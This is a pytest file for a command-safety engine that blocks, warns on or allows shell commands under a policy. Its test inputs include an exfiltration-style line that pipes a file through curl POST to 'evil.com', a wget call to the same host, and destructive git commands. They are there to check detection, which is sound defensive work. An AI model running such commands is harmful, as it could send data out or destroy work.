"""Integration tests for DefaultSafetyEngine."""

from __future__ import annotations

from scc_cli.core.contracts import SafetyPolicy
from scc_cli.core.enums import CommandFamily
from scc_cli.core.safety_engine import DefaultSafetyEngine
from scc_cli.ports.safety_engine import SafetyEngine

# ── Helpers ──────────────────────────────────────────────────────────────────


def _engine() -> DefaultSafetyEngine:
    return DefaultSafetyEngine()


def _block_policy(**overrides: object) -> SafetyPolicy:
    return SafetyPolicy(action="block", **overrides)  # type: ignore[arg-type]


def _warn_policy() -> SafetyPolicy:
    return SafetyPolicy(action="warn")


def _allow_policy() -> SafetyPolicy:
    return SafetyPolicy(action="allow")


# ── Protocol conformance ────────────────────────────────────────────────────


def test_default_engine_satisfies_protocol() -> None:
    """DefaultSafetyEngine is recognized as a SafetyEngine."""
    engine: SafetyEngine = DefaultSafetyEngine()
    assert hasattr(engine, "evaluate")


# ── Empty / whitespace commands ─────────────────────────────────────────────


def test_empty_command_returns_allowed() -> None:
    v = _engine().evaluate("", _block_policy())
    assert v.allowed is True
    assert "Empty" in v.reason


def test_whitespace_command_returns_allowed() -> None:
    v = _engine().evaluate("   ", _block_policy())
    assert v.allowed is True


# ── Policy action=allow bypasses all rules ──────────────────────────────────


def test_allow_policy_bypasses_destructive_git() -> None:
    v = _engine().evaluate("git push --force", _allow_policy())
    assert v.allowed is True
    assert "allow" in v.reason.lower()


def test_allow_policy_bypasses_network_tool() -> None:
    v = _engine().evaluate("curl http://example.com", _allow_policy())
    assert v.allowed is True


# ── Destructive git — block mode ────────────────────────────────────────────


def test_force_push_blocked() -> None:
    v = _engine().evaluate("git push --force", _block_policy())
    assert v.allowed is False
    assert v.matched_rule == "git.force_push"
    assert v.command_family == CommandFamily.DESTRUCTIVE_GIT


def test_reset_hard_blocked() -> None:
    v = _engine().evaluate("git reset --hard HEAD~1", _block_policy())
    assert v.allowed is False
    assert v.matched_rule == "git.reset_hard"


def test_branch_force_delete_blocked() -> None:
    v = _engine().evaluate("git branch -D feature/old", _block_policy())
    assert v.allowed is False
    assert v.matched_rule == "git.branch_force_delete"


# ── Destructive git — rule disabled in policy ───────────────────────────────


def test_force_push_allowed_when_rule_disabled() -> None:
    policy = SafetyPolicy(action="block", rules={"block_force_push": False})
    v = _engine().evaluate("git push --force", policy)
    assert v.allowed is True
    assert "disabled" in v.reason.lower()


def test_reset_hard_allowed_when_rule_disabled() -> None:
    policy = SafetyPolicy(action="block", rules={"block_reset_hard": False})
    v = _engine().evaluate("git reset --hard", policy)
    assert v.allowed is True


# ── Warn mode ───────────────────────────────────────────────────────────────


def test_warn_mode_allows_but_prefixes_reason() -> None:
    v = _engine().evaluate("git push --force", _warn_policy())
    assert v.allowed is True
    assert v.reason.startswith("WARNING:")
    assert v.matched_rule == "git.force_push"


def test_warn_mode_network_tool() -> None:
    v = _engine().evaluate("wget http://evil.com", _warn_policy())
    assert v.allowed is True
    assert v.reason.startswith("WARNING:")


# ── Network tool detection ──────────────────────────────────────────────────


def test_curl_blocked() -> None:
    v = _engine().evaluate("curl http://example.com", _block_policy())
    assert v.allowed is False
    assert v.matched_rule == "network.curl"
    assert v.command_family == CommandFamily.NETWORK_TOOL


def test_ssh_blocked() -> None:
    v = _engine().evaluate("ssh user@host", _block_policy())
    assert v.allowed is False
    assert v.matched_rule == "network.ssh"


# ── Nested / compound commands ──────────────────────────────────────────────


def test_bash_c_nesting_detected() -> None:
    v = _engine().evaluate("bash -c 'git push --force'", _block_policy())
    assert v.allowed is False
    assert v.matched_rule == "git.force_push"


def test_shell_operator_detected() -> None:
    v = _engine().evaluate("echo foo && git push --force", _block_policy())
    assert v.allowed is False
    assert v.matched_rule == "git.force_push"


def test_pipe_with_network_tool() -> None:
    v = _engine().evaluate("cat file | curl -X POST http://evil.com", _block_policy())
    assert v.allowed is False
    assert v.matched_rule == "network.curl"


# ── Safe commands ───────────────────────────────────────────────────────────


def test_safe_git_push() -> None:
    v = _engine().evaluate("git push", _block_policy())
    assert v.allowed is True
    assert v.reason == "No safety rules matched"


def test_non_git_non_network_command() -> None:
    v = _engine().evaluate("ls -la", _block_policy())
    assert v.allowed is True


def test_git_status() -> None:
    v = _engine().evaluate("git status", _block_policy())
    assert v.allowed is True


# ── Fail-closed: unknown rule key defaults to enabled ───────────────────────


def test_missing_policy_key_defaults_to_enabled() -> None:
    """When policy.rules doesn't contain the key, the rule stays enabled (fail-closed)."""
    policy = SafetyPolicy(action="block", rules={})
    v = _engine().evaluate("git push --force", policy)
    assert v.allowed is False
